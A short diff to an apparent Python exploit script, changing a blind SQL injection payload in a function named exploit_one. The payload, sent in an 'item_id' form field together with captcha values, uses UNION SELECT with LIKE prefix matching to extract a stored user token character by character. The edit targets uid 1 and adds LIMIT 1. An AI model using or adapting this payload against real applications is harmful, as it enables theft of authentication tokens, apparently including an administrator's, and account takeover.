@@ -48,7 +48,7 @@ def exploit_one(base: str, current: str, ch: str) -> str:
         'password': '1',
         'captcha_id': captcha_id,
         'captcha': captcha_text,
-        'item_id': f"aa') UNION SELECT 1,1,1,1,1,(SELECT 1 FROM user_token WHERE token LIKE '{current}{ch}%'),1,1,1,1,1,1 FROM user_token; -- "
+        'item_id': f"aa') UNION SELECT 1,1,1,1,1,(SELECT 1 FROM user_token WHERE uid = 1 AND token LIKE '{current}{ch}%' LIMIT 1),1,1,1,1,1,1 FROM user_token; -- "
     }).json()
 
     if data['error_code'] == 0:
